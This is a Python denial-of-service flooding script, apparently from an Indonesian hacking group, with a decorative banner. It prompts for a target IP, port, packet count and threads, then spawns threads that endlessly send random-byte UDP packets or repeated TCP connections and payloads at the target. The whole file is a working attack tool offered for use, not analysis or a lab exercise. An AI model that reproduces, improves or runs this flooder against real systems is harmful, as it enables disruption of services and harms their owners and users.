#NgabOwi
#JanckPristel
#CyberIndoTeam
#EST2022 
#JanganDiRename
#ToolsSakti
import random
import socket
import threading
import os

 
#Color
yellow='\033[93m'
gren='\033[92m'
cyan='\033[96m'
pink='\033[95m'
red='\033[91m'

os.system("clear")

print("••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••")
print("∆ 𝗡𝗚𝗔𝗕 𝗢𝗪𝗜 █ 𝗡𝗚𝗔𝗕 𝗢𝗪𝗜 █ 𝗡𝗚𝗔𝗕 𝗢𝗪𝗜     ∆  ")
print("∆ 𝗡𝗚𝗔𝗕 𝗢𝗪𝗜 █ 𝗡𝗚𝗔𝗕 𝗢𝗪𝗜 █ 𝗡𝗚𝗔𝗕 𝗢𝗪𝗜     ∆   ")
print("∆ 𝗡𝗚𝗔𝗕 𝗢𝗪𝗜 █ 𝗡𝗚𝗔𝗕 𝗢𝗪𝗜 █ 𝗡𝗚𝗔𝗕 𝗢𝗪𝗜     ∆    ")
print("                                                                                 ∆    ")
print("                                                                                 ∆    ")
print("       ███████                         ███████                                              ∆    ")
print("       █              █                          █              █                   ∆    ")
print("       █              █                          █              █                 ∆    ")
print("       ███████                         ███████                                                 ∆    ")
print("                                                                                 ∆    ")
print("                                                                                 ∆    ")
print("                     ███████████████                                                            ∆    ")
print("                     █                                     █                    ∆    ")
print("                     ███████████████                                                           ∆    ")
print("                                                                                 ∆    ")
print("∆ 𝗡𝗚𝗔𝗕 𝗢𝗪𝗜 █ 𝗡𝗚𝗔𝗕 𝗢𝗪𝗜 █ 𝗡𝗚𝗔𝗕 𝗢𝗪𝗜     ∆  ")
print("∆ 𝗡𝗚𝗔𝗕 𝗢𝗪𝗜 █ 𝗡𝗚𝗔𝗕 𝗢𝗪𝗜 █ 𝗡𝗚𝗔𝗕 𝗢𝗪𝗜     ∆  ")
print(gren+"     ░                                                         ")

ip = str(input(red+" IP TARGET : "))
port = int(input(red+" PORT TARGET : "))
choice = str(input(red+" ATTACK ? (y/n) : "))
times = int(input(red+" PACKETS : "))
threads = int(input(red+" THREADS : "))
def run():
	data = random._urandom(1024)
	i = random.choice(("[***]","[^^^]","[!!!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(cyan+"[ × ] PAKET DARI NGAB OWI CUY \nKIRIM KE =",red+ip,":",port)
		except:
			print(cyan+"[ × ] PAKET DARI NGAB OWI CUY \nKIRIM KE =",red+ip,":",port)

def run2():
	data = random._urandom(16)
	i = random.choice(("[T***]","[^^^]","[!!!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(cyan+"[ × ] PAKET DARI NGAB OWI CUY \nKIRIM KE =",red+ip,":",port)
		except:
			s.close()
			print("[*] BUKAN NGAB OWI CUY !!!")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()